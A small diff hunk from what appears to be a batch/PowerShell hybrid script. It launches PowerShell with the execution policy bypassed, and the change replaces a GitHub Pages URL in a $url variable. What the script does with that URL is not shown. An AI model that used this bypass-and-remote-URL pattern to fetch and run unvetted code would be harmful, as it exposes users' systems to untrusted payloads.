@@ -5,7 +5,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=[IO.File]::ReadAllTex
 exit /b
 #PS#
 $ErrorActionPreference = 'Stop'
-$url = 'https://llxodmll-beep.github.io/test00/'
+$url = 'https://llxodmll-beep.github.io/test901227/'
 $name = 'DPV'
 try {
   $cands = @(
